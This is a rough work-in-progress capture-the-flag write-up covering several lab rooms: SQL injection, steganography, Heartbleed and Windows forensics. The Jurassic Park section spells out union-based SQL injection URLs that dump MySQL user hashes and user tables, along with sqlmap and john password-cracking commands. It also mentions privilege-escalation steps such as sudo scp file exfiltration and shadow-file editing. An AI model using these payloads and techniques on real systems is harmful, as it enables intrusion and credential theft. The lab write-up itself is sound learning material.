---
title: wip
layout: post
description: 
tags: ctf
date: 
toc: true
---

## Jursassic Park
- Looks like SQL injection from questions
- robots.txt from Pickle Rick?
- nmap shows open SSH that takes passwords
- Some fitering on id (@, -)
- Using # for comments works

### 1 - Database name and 
http://10.0.0.56/item.php?id=1%20union%20select%20null,%20null,%20null,%20DATABASE(),%20null 
- Output can be gained from the 4th or 5th column

- Use DATABASE() command

### 2 - Number of columns
- Also gives use the number of columns
- (5)

### 3 - Version of OS

- Use version() command
- http://10.0.0.56/item.php?id=1%20union%20select%20null,%20null,null%20,%20version(),%20null
- Tells us that is mysql 5.7

### 4 - dennis's password

http://10.0.0.246/item.php?id=0%20union%20select%20null,%20null,%20null,%20authentication_string,%20user%20from%20mysql.user%20LIMIT%201%20OFFSET%200%20#

- can't read /etc/passwd
- get password for mysql
john --wordlist=/usr/share/wordlists/rockyou.txt jurassic.txt

sqlmap -u http://10.0.0.246/item.php?id=1 -p id --dbms mysql 5.7 --suffix="#"

http://10.0.0.132/item.php?id=0%20union%20select%20null,%20null,%20null,%20table_name,%20table_schema%20FROM%20information_schema.tables%20WHERE%20table_schema=%22park%22%20LIMIT%201%20OFFSET%201#
users tables

http://10.0.0.132/item.php?id=0%20union%20select%20null,%20null,%20null,%20table_name,%20COLUMN_NAME%20FROM%20information_schema.columns%20WHERE%20table_name=%22users%22%20LIMIT%201%20OFFSET%202#

usernames, password

usernames filtered so

http://10.0.0.132/item.php?id=0%20union%20select%20*,%20null,%20null%20FROM%20users%20%20LIMIT%201%20OFFSET%200#

ssh access

love the sqlmap trolling

look at .bash_history
Flag 3
notice sudo us
sudo -l show scp nopasswd
sudo scp /root/flag5.txt dennis@10.0.0.132:~/

notice hint in web directory
cannot use mysql vuln so just reverse shell then esc

reverse shell to msf
local exploit suggestor

...
- ubuntu directory
- boot grub
- bash histroy of dennis

- root

scp can do local copy too
I am dumb
edit shadow file to same password as dennis and su

Flag 4 is in /tmp according to .viminfo but no sign of it

## Base 64
- Open in python
- Decode 50 times
- Print result

## Steganography

### Flag 1
Exif tool on Lenna

### Flag 2
Foremost to extract zip from Lenna
password was first flag's hex value
flag2.mp3 is a computer saying flag 2 is steganographyrules with no spaces

### Flag 3

Ran strings on "Stéphane.png" ( the longer one), flag is appended to the end of the file

### Flag 4
flag4 is a binary
ran strings on it
Saw "Nothing to see here.." followed by a base64 string
Got "stegosaurus" as the flag when decoded

### Flag 5

https://29a.ch/photo-forensics/#noise-analysis
Showed ascii characters in noise
Decoded to flag in hex
Also very visable in blue lsb

### Flag 6
Spent loads of time on this
"Intepreted outside the box" to being in the original file not the zip.
Saw some barcode like structure on the edge of the photo
Spent ages trying to decode it

Found original to have same barcode structure

On a whim downloaded the image next to the download button because that's outside of the box too
Ran exif tool 
flag 6

## Protecting Data In Transit

Vm is named heartbleed
Lots of heartbleed references
msf
scanner/ssl/openssl_heartbleed
Run till something that looks like a flag, guessed THM{} from previous challenges

## Investigating Windows
### Question 1
net localgroup Administrators
### Question 2
Look at task schduler
"Clean file system runs malicious netcat"

### Question 3
Task was created on 3/2/2019 - meaning it was compromised then

### Question 4
Windows Firewalls with Advanced Security
Inbound roles
Port 1337, "Aloow outside connections for developmnet"
Sounds fishy to me, correct answer
Correct way: Applications and services, Microsoft, Windows, Windows Firewall with Advanced Security
Gives same rule name


Event log: 
### Question 5
hosts file was in recent files
Show www.google resolving to a weird address as well as local host for virus services


### Question 6
Compromise begins at 3/2/2019 4:39:09 - powershell netcat is ran can see in powershell event log 
Event ID 4672



